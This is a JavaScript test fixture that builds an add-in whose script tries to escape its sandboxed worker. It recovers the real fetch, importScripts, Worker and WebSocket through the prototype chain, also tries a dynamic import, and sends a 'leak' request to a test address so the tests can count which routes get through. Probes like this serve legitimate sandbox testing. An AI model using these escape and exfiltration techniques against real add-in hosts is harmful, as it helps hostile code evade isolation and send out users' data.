'use strict';
// An add-in that tries every way out of its worker it can find, sending `leak` to an address: the
// browser's own fetch, importScripts and IndexedDB reached through the prototypes behind the
// worker's global object, a dynamic import(), a nested worker and a WebSocket. Used by the add-in
// tests (web and desktop), which count what reaches the address.
module.exports = base => JSON.stringify({
  id: 'test.escape', name: 'Escape', version: '1', apps: ['write'], permissions: ['read'], commands: [{ id: 'escape', label: 'Escape' }],
  script: `isadek.onCommand('escape', async () => {
    const base = ${JSON.stringify(base)}, r = {};
    const chain = []; for (let o = self; o; o = Object.getPrototypeOf(o)) chain.push(o);
    const real = name => { for (const o of chain) { const d = Object.getOwnPropertyDescriptor(o, name); if (!d) continue; try { const v = d.get ? d.get.call(self) : d.value; if (v) return v; } catch { /* no */ } } return null; };
    const f = real('fetch'); r.fetch = f ? await f.call(self, base + '/fetch?leak=1').then(() => 'sent', e => 'error ' + e.message) : 'gone';
    const imp = real('importScripts'); try { r.importScripts = imp ? (imp.call(self, base + '/importScripts.js?leak=1'), 'ran') : 'gone'; } catch (e) { r.importScripts = 'error'; }
    try { await import(base + '/import.js?leak=1'); r.import = 'loaded'; } catch (e) { r.import = 'error'; }
    const idb = real('indexedDB'); r.indexedDB = idb ? 'reachable' : 'gone';
    const W = real('Worker'); try { r.worker = W ? (new W(base + '/worker.js?leak=1'), 'made') : 'gone'; } catch { r.worker = 'error'; }
    const WS = real('WebSocket'); try { r.ws = WS ? (new WS(base.replace('http', 'ws') + '/ws?leak=1'), 'made') : 'gone'; } catch { r.ws = 'error'; }
    await new Promise(res => setTimeout(res, 800));
    await isadek.ui.showPane('Escape', [{ type: 'text', text: JSON.stringify(r) }]);
  });`
});
